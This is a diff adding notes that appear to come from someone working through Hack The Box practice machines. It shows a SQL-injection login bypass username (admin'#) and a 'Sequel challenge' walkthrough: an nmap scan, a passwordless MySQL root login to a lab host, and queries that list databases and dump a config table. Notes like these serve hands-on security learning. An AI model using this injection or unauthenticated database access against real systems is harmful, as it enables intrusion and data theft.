@@ -60,3 +60,14 @@
 - http://10.129.164.88/
 - Username: admin'#
 - Password: abc123
+
+
+## Sequel challenge:
+- sudo nmap -sC -sV 10.129.95.232
+- sudo apt update && sudo apt install mysql *
+- mysql --help
+- mysql -h 10.129.95.232 -u root
+- SHOW databases;
+- USE htb;
+- SHOW tables;
+- SELECT * FROM config;
